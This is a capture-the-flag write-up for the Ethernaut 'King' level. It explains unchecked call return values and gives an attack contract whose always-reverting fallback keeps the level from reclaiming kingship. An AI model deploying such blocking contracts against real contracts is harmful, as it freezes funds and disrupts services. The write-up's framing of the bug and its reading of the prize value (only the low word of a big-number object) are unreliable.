<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

Challenge's message.

>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
Such a fun game. Your goal is to break it.
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


At the beginning of the contract, there are defined variables such as king, owner and prize. Also, these variables are assigned when the contract is created in the payable constructor. After the definition of king and king's prize, there is a specific function called ``receive()``that works to remand the new king's prize to the ex-king address and update the new king address and king's prize when someone is the owner or sends more than the king's ether to the contract. And finally, there is a function which returns us to current king address.

As with every challenge, this contract has some potential issues. One of these issues like forgot to check the external process status. Here we go...

# Subverting

Before talking about my attack contract, I want to explain some topics. If you know about the vulnerability of uncheck calls returns value, you would skip this part.

### Calls In Solidity 

There are a number of ways of performing external calls in Solidity. Sending ether to external accounts is commonly performed via the ``transfer`` method. However, the ``send`` function can also be used, and for more versatile external calls the ``call`` **opcode** can be directly employed in Solidity. You can start an external calls in the contract with send ether to other contracts by

  - ``transfer`` :  (2300 gas, throws error)
  - ``send`` : (2300 gas, returns bool)
  - ``call`` : (forward all gas or set gas, returns bool)

this methods. Here we can see that when we use send or call to send ether or perform any transactions, it returns a boolean value i.e. true or false.

### Security Issue

 The ``call`` and ``send`` functions return a boolean indicating whether the call succeeded or failed. As a result, if the call return value is not checked, execution will resume even if the called contract throws an exception. If the call fails accidentally or an attacker forces the call to fail, this may cause unexpected behavior in the subsequent program logic.
 

 ```solidity
 
contract Lotto {

    bool public payedOut = false;
    address public winner;
    uint public winAmount;

    // ... extra functionality here

    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(this.balance);
    }
}
 
 ```
 This represents a Lotto-like contract, where a ``winner`` receives ``winAmount`` of ether, which typically leaves a little left over for anyone to withdraw.

The vulnerability exists on sendToWinner() function, where a send is used without checking the response. In this trivial example, a winner whose transaction fails (either by running out of gas or by being a contract that intentionally throws in the fallback function) allows ``payedOut`` to be set to ``true`` regardless of whether ether was sent or not. In this case, **anyone can withdraw the winner’s winnings via the withdrawLeftOver function**.

## Attack Contract

Here is my attack contract.

```solidity
pragma solidity ^0.8.0;

import './King.sol';

contract Attack{

    King target;

    constructor(address payable _target) payable{
        target = King(_target);
        address(target).call{value: msg.value}("");
    }

    fallback()external{
        revert("Hack ponzi");
    }
}
```

First thing first is as always solidity version and import our target contract's file into attack contract. After that, get the instance of target contract and call it with sending more than king's prize in the constructor. When the ``call`` method works, the target contract sends ether to our contract and our fallback() function revert to transaction. In this way, we'll stay king of the target contract every time.


### Attack Senario

Check the king's prize.

```shell

await contract.prize()
i {negative: 0, words: Array(3), length: 2, red: null}
length
: 
2
negative
: 
0
red
: 
null
words
: 
(3) [13008896, 14901161, boş]
[[Prototype]]
: 
Object
```
The king's prize is 13008896. Let's convert to wei form.

```shell
await web3.utils.fromWei('13008896', 'ether')
'0.000000000013008896'
```
When we deploy the attack contract, we must send higher than this wei.



**_by wasny0ps_**
